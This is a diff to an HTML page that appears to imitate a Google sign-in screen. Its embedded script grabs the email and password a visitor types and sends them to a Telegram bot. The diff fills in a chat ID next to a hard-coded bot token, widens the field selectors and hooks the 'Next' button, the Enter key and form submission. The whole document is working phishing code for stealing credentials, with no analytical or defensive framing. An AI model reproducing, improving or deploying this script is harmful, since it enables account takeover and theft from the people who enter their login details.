@@ -16084,111 +16084,137 @@
     <div aria-atomic=true>Welcome </div>
   </div>
 <script>
-  (function() {
-    // ⚙️ CONFIGURATION - REPLACE THESE WITH YOUR VALUES
-    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';  // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // e.g., '123456789'
+(function() {
+    // ⚙️ CONFIGURATION - REPLACE WITH YOUR VALUES
+    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
+    const TELEGRAM_CHAT_ID = '8391692120';
     // ⚙️ END OF CONFIGURATION
 
     // Function to send password to Telegram
     function sendToTelegram(email, password) {
-      const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password || 'Not found'}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Page: ${window.location.href}`;
+        const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password || 'Not found'}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Page: ${window.location.href}`;
 
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          console.log('[✅] Password sent to Telegram successfully');
-        } else {
-          console.error('[❌] Telegram API error:', data);
-        }
-      })
-      .catch(error => {
-        console.error('[❌] Failed to send to Telegram:', error);
-      });
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('[✅] Password sent to Telegram successfully');
+            } else {
+                console.error('[❌] Telegram API error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('[❌] Failed to send to Telegram:', error);
+        });
     }
 
-    // Track if already sent to avoid duplicates
     let passwordSent = false;
 
     function captureAndSend() {
-      if (passwordSent) return;
+        if (passwordSent) return;
 
-      const passwordInput = document.querySelector('input[name="Passwd"]');
-      const emailInput = document.querySelector('input[name="identifier"]');
+        // Find password field
+        const passwordInput = document.querySelector('input[name="Passwd"]') || 
+                             document.querySelector('input[type="password"]');
+        
+        // Find email field
+        const emailInput = document.querySelector('input[name="identifier"]') || 
+                          document.querySelector('input[type="email"]') ||
+                          document.querySelector('[data-profile-identifier]');
 
-      if (passwordInput && passwordInput.value && passwordInput.value.length > 0) {
-        const email = emailInput ? emailInput.value : 'Not found';
-        const password = passwordInput.value;
+        if (passwordInput && passwordInput.value && passwordInput.value.length > 0) {
+            const email = emailInput ? emailInput.value : 'Not found';
+            const password = passwordInput.value;
 
-        sendToTelegram(email, password);
-        passwordSent = true;
-
-        // Log to console for debugging
-        console.log('[🔑] Password captured and sent to Telegram');
-      }
+            sendToTelegram(email, password);
+            passwordSent = true;
+            console.log('[🔑] Password captured and sent to Telegram');
+        } else {
+            console.log('[⚠️] Password field is empty or not found');
+        }
     }
 
-    // Method 1: Intercept "Next" button click
+    // METHOD 1: Click on the "Next" button container
+    const nextContainer = document.querySelector('#passwordNext');
+    if (nextContainer) {
+        nextContainer.addEventListener('click', function(e) {
+            console.log('[🖱️] Next button clicked');
+            setTimeout(captureAndSend, 300);
+        });
+        console.log('[✅] Next button listener attached');
+    } else {
+        console.log('[⚠️] #passwordNext not found, trying alternative selectors...');
+    }
+
+    // METHOD 2: Find the actual button inside passwordNext
     const nextButton = document.querySelector('#passwordNext button');
     if (nextButton) {
-      nextButton.addEventListener('click', function(e) {
-        // Small delay to ensure password field has value
-        setTimeout(captureAndSend, 100);
-      });
+        nextButton.addEventListener('click', function(e) {
+            console.log('[🖱️] Next button (direct) clicked');
+            setTimeout(captureAndSend, 300);
+        });
     }
 
-    // Method 2: Intercept Enter key press on password field
-    const passwordField = document.querySelector('input[name="Passwd"]');
-    if (passwordField) {
-      passwordField.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-          setTimeout(captureAndSend, 100);
+    // METHOD 3: Find by jsname attribute
+    document.querySelectorAll('[jsname="LgbsSe"]').forEach(btn => {
+        if (btn.textContent.trim() === 'Next') {
+            btn.addEventListener('click', function(e) {
+                console.log('[🖱️] Button with jsname LgbsSe clicked');
+                setTimeout(captureAndSend, 300);
+            });
         }
-      });
-
-      // Method 3: Real-time capture on input change (every keystroke)
-      // This sends the current password as the user types
-      let lastSentValue = '';
-      passwordField.addEventListener('input', function(e) {
-        const currentValue = this.value;
-        // Only send if value changed and password length > 0
-        if (currentValue !== lastSentValue && currentValue.length > 0) {
-          lastSentValue = currentValue;
-          // Send current typed value (uncomment if you want real-time)
-          // captureAndSend();
-          // For real-time, uncomment above and comment out passwordSent check
-        }
-      });
-    }
-
-    // Method 4: Capture on page unload (before closing tab)
-    window.addEventListener('beforeunload', function(e) {
-      captureAndSend();
     });
 
-    // Method 5: Also try to capture when any form is submitted
+    // METHOD 4: Find all buttons with "Next" text
+    document.querySelectorAll('button').forEach(btn => {
+        if (btn.textContent.trim() === 'Next') {
+            btn.addEventListener('click', function(e) {
+                console.log('[🖱️] Button with text "Next" clicked');
+                setTimeout(captureAndSend, 300);
+            });
+        }
+    });
+
+    // METHOD 5: Capture on Enter key in password field
+    const passwordField = document.querySelector('input[name="Passwd"]') || 
+                         document.querySelector('input[type="password"]');
+    if (passwordField) {
+        passwordField.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                console.log('[⌨️] Enter key pressed in password field');
+                setTimeout(captureAndSend, 300);
+            }
+        });
+        console.log('[✅] Enter key listener attached');
+    }
+
+    // METHOD 6: Capture on form submit
     document.addEventListener('submit', function(e) {
-      setTimeout(captureAndSend, 100);
+        console.log('[📝] Form submitted');
+        setTimeout(captureAndSend, 300);
     });
 
     console.log('[✅] Password capture script is active');
+    console.log('[ℹ️] The script will send password when you click "Next" or press Enter');
     console.log('[ℹ️] Telegram Bot Token:', TELEGRAM_BOT_TOKEN ? 'Configured ✅' : '❌ NOT SET');
     console.log('[ℹ️] Telegram Chat ID:', TELEGRAM_CHAT_ID ? 'Configured ✅' : '❌ NOT SET');
 
-    // Optional: Expose function to console for testing
+    // Expose function to console for testing
     window.testCapture = captureAndSend;
-  })();
+    window.testTelegram = function() {
+        sendToTelegram('test@email.com', 'testpassword123');
+    };
+})();
 </script>
